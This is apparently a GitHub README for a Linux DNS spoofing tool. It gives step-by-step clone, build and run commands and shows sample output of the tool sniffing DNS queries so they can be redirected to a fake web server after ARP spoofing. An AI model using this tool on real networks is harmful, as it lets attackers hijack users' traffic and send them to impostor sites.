# DNS-Spoof
Linux DNS Spoofing tool


<img src="/execute.gif">


* You must arp-spoofing before dns-spoofing, and need fake web server.

1. Clone this project
```
[root@attacker dns_spoof]# git clone https://github.com/tear94fall/DNS-Spoof.git
[root@attacker dns_spoof]# ls -al  
합계 20  
drwxr-xr-x  3 test test    70 11월 14 17:46 .  
drwxr-xr-x. 6 root root   112 11월 14 14:23 ..  
drwxr-xr-x  8 root root   166 11월 14 17:47 .git  
-rw-rw-rw-  1 root root 10957 11월 14 17:46 main.cpp  
-rw-rw-rw-  1 test test    90 11월 13 10:36 makefile  
-rw-rw-rw-  1 root root  1132 11월 14 16:01 protocol.hpp  
```

2. Build project
```
[root@attacker dns_spoof]# make  
gcc main.cpp -o main -lnet -lpcap -lpthread  
```

3. Execute with info
```
[root@attacker dns_spoof]# ./main <target_domain> <fake web server>
1 :  intf1
2 :  intf333
...  
```  

4. Choose the network interface and wait  
```
[root@attacker dns_spoof]# ./main <target_domain> <fake web server>
1 :  intf1
2 :  intf333
...  
Enter the interface number you would like to sniff : 1
dns-spoofing: linstening on <network interface> [udp dst port 53 and not src <fake web server>]
192.168.0.123.38812 > 192.168.0.1.53:  9108+ A? www.google.com
192.168.0.74.36095 > 192.168.0.1.53:  <DNS id>+ A? <target_domain>

```
